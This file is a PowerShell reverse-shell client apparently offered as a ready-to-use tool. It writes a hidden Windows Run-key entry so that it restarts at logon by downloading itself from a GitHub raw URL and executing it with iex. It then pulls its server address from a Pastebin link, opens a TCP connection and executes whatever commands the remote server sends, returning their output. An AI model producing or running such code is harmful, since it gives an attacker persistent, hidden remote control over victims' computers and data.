# Replace address and port with your server's
# You can edit the script URL if you are hosting it somewhere else

$address = 'localhost'
$port = 8000
$scriptURL = 'https://raw.githubusercontent.com/PhantomControl/ReversePowershell/PhantomControl-patch-1/client.ps1'
$autorunKeyName = "Windows Powershell"
$autorunKeyVal = 'powershell -WindowStyle Hidden -nop -c "iex (New-Object Net.WebClient).DownloadString(''' + $scriptURL + ''')"'

# Persist if the system is windows
if ($IsWindows){

$autoruns = Get-ItemProperty HKCU:\Software\Microsoft\Windows\CurrentVersion\Run
if (-not $autoruns.$autorunKeyName) {
    New-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\Run -Name $autorunKeyName -Value $autorunKeyVal
}
elseif($autoruns.$autorunKeyName -ne $autorunKeyVal) {
    Remove-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\Run -Name $autorunKeyName
    New-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\Run -Name $autorunKeyName -Value $autorunKeyVal
}
}

else {}

while ($true) {
    # Try to connect to server every 10s
    do {
        try {
            $Settings = (New-Object System.Net.WebClient).DownloadString('https://pastebin.com/raw/6Tnt6aG9')
            $a,$b = $settings.split(":")[0,1]
	    Write-Host "Trying to reach "$a":"$b
            $client = New-Object System.Net.Sockets.TcpClient($a, $b)  
            $stream = $client.GetStream()
            $writer = New-Object System.IO.StreamWriter($stream)
            $reader = New-Object System.IO.StreamReader($stream)
            break
        }
        catch {
            Start-Sleep -s 10
        }
    } while ($true)
    
    Write-Host "Connected"
    # Execute commands sent by the server, and return output
    try {
        do {
            $cmd = $reader.ReadLine()
            if ($cmd -eq 'exit') {
                Write-Host "Exiting"
                break
            }
            try {
                $output = [string](iex $cmd)
            }
            catch {
                $output = $_.Exception.Message
            }
            $writer.WriteLine($output)
            $writer.Flush()
        } while($true)
    }
    catch {
        Write-Host $_.Exception.Message
    }
    
    # Cleanup
    $writer.Close()
    $reader.Close()
    $stream.Close()
    $client.Close()
}
